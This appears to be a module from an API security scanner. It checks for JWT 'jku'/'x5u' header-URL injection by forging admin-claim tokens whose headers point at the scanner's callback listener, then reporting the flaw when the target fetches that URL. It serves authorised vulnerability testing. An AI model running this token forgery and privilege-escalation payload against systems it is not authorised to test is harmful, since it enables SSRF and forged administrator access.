"""JWT `jku` / `x5u` header-URL injection (OWASP API2:2023, CWE-347).

A JWT header may carry a URL that tells the verifier where to fetch the signing
key: `jku` (JWKS URL) or `x5u` (X.509 cert URL). A verifier that trusts those
header-supplied URLs can be pointed at attacker-controlled infrastructure, which
is both an SSRF primitive and a key-injection / token-forgery primitive.

We confirm the flaw the same way the SSRF module does: forge a token whose
`jku`/`x5u` header points at APIStrike's own OAST listener, send it to the
authenticated probe endpoint, and record a CONFIRMED critical finding when the
server dials back to fetch our URL (proving it resolves header-supplied key
sources). The listener only records callbacks -- it never serves key material --
so this is safe and non-destructive.

This module reuses helpers from `jwt_advanced` when importable, but its pure
token-building logic is dependency-free so it can be unit-tested offline.
"""
import base64
import json
from typing import Optional

# --- optional integrations (module still imports without them) --------------
try:  # admin-claim helper from the advanced module (feature branch)
    from apistrike.modules.jwt_advanced import _admin_claims as _adv_admin_claims
except Exception:  # noqa: BLE001
    _adv_admin_claims = None

try:
    from apistrike.core.findings import Finding
except Exception:  # noqa: BLE001
    Finding = None  # type: ignore

try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes
    _CRYPTO = True
except Exception:  # noqa: BLE001
    _CRYPTO = False

OWASP_ID = "API2:2023"
_SUPPORTED_FIELDS = ("jku", "x5u")


# --- pure helpers (stdlib only) --------------------------------------------
def _b64url_bytes(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _b64url_json(obj: dict) -> str:
    return _b64url_bytes(json.dumps(obj, separators=(",", ":"), sort_keys=True).encode("utf-8"))


def _b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _payload_of(token: str) -> dict:
    try:
        return json.loads(_b64url_decode(token.split(".")[1]))
    except Exception:  # noqa: BLE001
        return {}


def build_header_url_jwt(header_field: str, url: str, payload: dict, signer,
                         *, kid: str = "apistrike", alg: str = "RS256") -> str:
    """Assemble `header.payload.signature`, embedding `url` in the given header
    field. `signer` is a callable(bytes) -> bytes over the signing input.
    Pure/deterministic: no crypto import required (crypto lives in `signer`)."""
    if header_field not in _SUPPORTED_FIELDS:
        raise ValueError("header_field must be one of %r" % (_SUPPORTED_FIELDS,))
    header = {"alg": alg, "typ": "JWT", header_field: url}
    if kid:
        header["kid"] = kid
    h_raw = _b64url_json(header)
    p_raw = _b64url_json(payload)
    signing_input = (h_raw + "." + p_raw).encode("utf-8")
    sig = signer(signing_input)
    return h_raw + "." + p_raw + "." + _b64url_bytes(sig)


def _admin_payload(token: str) -> dict:
    if _adv_admin_claims is not None:
        try:
            return _adv_admin_claims(token)
        except Exception:  # noqa: BLE001
            pass
    payload = _payload_of(token)
    payload.update({"role": "admin", "is_admin": True, "admin": True, "scope": "admin"})
    return payload


# --- crypto-backed forgers --------------------------------------------------
def _new_rsa_signer():
    if not _CRYPTO:
        raise RuntimeError("cryptography is required to forge signed tokens")
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    def signer(data: bytes) -> bytes:
        return key.sign(data, padding.PKCS1v15(), hashes.SHA256())

    return key, signer


def forge_jku_injection(token: str, jku_url: str) -> Optional[str]:
    """RS256 token with an admin payload and a `jku` header pointing at jku_url."""
    if not _CRYPTO:
        return None
    _key, signer = _new_rsa_signer()
    return build_header_url_jwt("jku", jku_url, _admin_payload(token), signer)


def forge_x5u_injection(token: str, x5u_url: str) -> Optional[str]:
    """RS256 token with an admin payload and an `x5u` header pointing at x5u_url."""
    if not _CRYPTO:
        return None
    _key, signer = _new_rsa_signer()
    return build_header_url_jwt("x5u", x5u_url, _admin_payload(token), signer)


_REMEDIATION = (
    "Never resolve key-source URLs supplied in the token header ('jku'/'x5u'/'x5c'). "
    "Verify only against keys from a trusted, server-side key store; if remote JWKS is "
    "required, pin it to an allowlist of exact HTTPS URLs and validate the fetched host/IP."
)


async def run_jku_x5u_checks(module, result, listener, live: bool = True) -> None:
    """Live check wired into BrokenAuthModule.run() via jwt_advanced. Forges
    jku/x5u tokens pointing at `listener` and confirms SSRF/key-injection when
    the target dials back. Uses the module's scope-gated client via _probe()."""
    if not live:
        return
    if listener is None:
        result.notes.append("jku/x5u checks skipped: no OAST listener (pass --jku-oast <public-host>).")
        return
    if not _CRYPTO:
        result.notes.append("jku/x5u checks skipped: 'cryptography' not installed.")
        return
    token = getattr(module, "valid_token", None)
    if not token:
        result.notes.append("jku/x5u checks skipped: no valid token to base the forgery on.")
        return

    payload = _admin_payload(token)
    _key, signer = _new_rsa_signer()
    wait_ms = int(getattr(module, "oast_wait_ms", 2000) or 2000)
    owasp_id = getattr(module, "OWASP_ID", OWASP_ID)
    endpoint = getattr(module, "probe_path", "/")

    for field, suffix in (("jku", "/.well-known/jwks.json"), ("x5u", "/apistrike.pem")):
        cb = listener.new_token()
        url = listener.payload_url(cb, path_suffix=suffix)
        forged = build_header_url_jwt(field, url, payload, signer)
        ev = await module._probe(forged)
        status = getattr(ev, "status_code", None)
        hits = listener.poll(cb, wait_ms=wait_ms)
        if hits:
            first = hits[0]
            method = getattr(first, "method", "GET")
            remote = getattr(first, "remote_addr", "")
            if Finding is not None:
                result.findings.append(Finding(
                    title="JWT '%s' header key-source injection: server fetched attacker URL" % field,
                    severity="critical", owasp_id=owasp_id, endpoint=endpoint,
                    cwe="CWE-347", confidence="confirmed",
                    description=(
                        "A token whose '%s' header pointed at an attacker-controlled URL caused the "
                        "server to issue an out-of-band %s request to our OAST listener (correlation "
                        "token %s, from %s). The verifier resolves key material from a URL inside the "
                        "token header, so an attacker who hosts a matching key can forge tokens for any "
                        "user, including admins (and this doubles as an SSRF primitive)."
                        % (field, method, cb, remote)
                    ),
                    recommendation=_REMEDIATION,
                    evidence=[
                        module._evidence("%s_injection" % field, forged, status,
                                         {"callback_url": url, "callbacks": len(hits), "token": cb}),
                        {"check": "%s_callback" % field, "method": method,
                         "remote_addr": remote, "token": cb},
                    ],
                ))
        else:
            result.notes.append(
                "'%s' header URL not fetched by target within %dms (no OAST callback)." % (field, wait_ms)
            )
